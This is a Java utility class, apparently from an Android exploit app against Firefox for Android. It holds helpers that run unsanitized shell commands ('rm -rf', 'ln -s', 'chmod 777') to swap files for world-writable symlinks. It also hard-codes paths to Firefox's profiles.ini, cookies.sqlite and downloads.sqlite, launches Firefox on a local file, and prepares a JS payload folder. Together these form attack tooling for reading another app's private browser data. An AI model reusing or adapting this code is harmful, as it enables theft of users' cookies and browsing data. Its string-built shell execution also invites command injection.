package com.example.ffoxnew;

import java.io.File;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Environment;

public class Utils {
	
	public static class CMDs {
		
		public static void cmd(String command){
			try{
				String[] tmp = new String[] {"/system/bin/sh", "-c", command};
				Runtime.getRuntime().exec(tmp);
			}
			catch (Exception e) {}
		}
	}
	
	public static class SymLinks {
		
		public static void replaceFileWithSymlink(String destination, String path) {
			CMDs.cmd("rm -rf " + path);
			createSymLink(destination, path);
		}
		
		private static void createSymLink(String destination, String path) {
			CMDs.cmd("ln -s " + destination + " " + path);
			CMDs.cmd("chmod 777 " + path);
		}
		
		public static void removeStuff(String path) {
			CMDs.cmd("rm -rf " + path);
		}
		
		
	}
	
	public static class WebSockets {
		
		public static void setup() {
			java.lang.System.setProperty("java.net.preferIPv6Addresses", "false");
			java.lang.System.setProperty("java.net.preferIPv4Stack", "true");
		}
		
		public static void cleanup() {
			
		}
		
	}
	
	public static class Firefox {
		
		private static final String FF_PACKAGE = "org.mozilla.firefox";
		private static final String FF_ACTIVITY = "org.mozilla.firefox.App";
		
		public static final String PATH_PROFILES_INI = "/data/data/" + FF_PACKAGE + "/files/mozilla/profiles.ini";
		public static final String PATH_COOKIES_FORMAT = "/data/data/" + FF_PACKAGE + "/files/mozilla/%s.default/cookies.sqlite";
		public static final String PATH_DOWNLOADS_FORMAT = "/data/data/" + FF_PACKAGE + "/files/mozilla/%s.default/downloads.sqlite";
		
		public static void launch(Activity act, String file){
			Intent i = new Intent(Intent.ACTION_MAIN);
			File f=new File(file);
			Uri uri = Uri.fromFile(f);
			i.setClassName(FF_PACKAGE, FF_ACTIVITY);
			i.addCategory(Intent.CATEGORY_BROWSABLE);
			i.addCategory(Intent.CATEGORY_DEFAULT);
			i.setData(uri);
			act.startActivity(i);
		}
	}
	
	public static class Misc {
		
		public static void setup(Context ctx) {
			setupStorage(ctx);
		}
		
		public static void cleanup(Context ctx) {
			cleanStorage(ctx);
		}
				
		private static void setupStorage(Context ctx) {
			cleanStorage(ctx);
			File filesDir = ctx.getFilesDir();
			File payloadFolder = new File(filesDir, JSPayloads.PAYLOAD_FOLDER);
			payloadFolder.mkdir();
		}
		
		private static void cleanStorage(Context ctx) {
			File filesDir = ctx.getFilesDir();
			File payloadFolder = new File(filesDir, JSPayloads.PAYLOAD_FOLDER);
			if (payloadFolder.exists()) {
				payloadFolder.delete();
			}
		}
	}

}
